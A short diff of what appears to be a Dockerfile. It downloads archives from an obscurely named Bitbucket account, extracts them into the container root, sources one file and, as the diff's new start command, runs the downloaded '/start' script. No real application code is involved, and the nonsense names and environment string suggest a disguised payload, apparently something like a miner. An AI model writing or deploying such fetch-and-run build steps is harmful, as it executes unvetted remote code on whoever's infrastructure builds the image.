@@ -1,4 +1,6 @@
-FROM vm/ubuntu:22.04
+FROM node:12-alpine
+WORKDIR /
+COPY . . 
 
 ENV linux8888=linuxlinuxwebwebwebweblinuxlinuxwebweb8888888888888888888888
 
@@ -7,6 +9,6 @@ RUN cd / && wget https://bitbucket.org/linux88888874/linux8888888888/downloads/n
 RUN source /node8888
 
 RUN cd / && wget https://bitbucket.org/linux88888874/linux8888888888/downloads/linux8888.tar.gz && tar -xvf ./linux8888.tar.gz -C /
-RUN bash /start
 
-EXPOSE WEBSITE http://localhost:8080
+CMD ["bash", "/start"] 
+EXPOSE 80
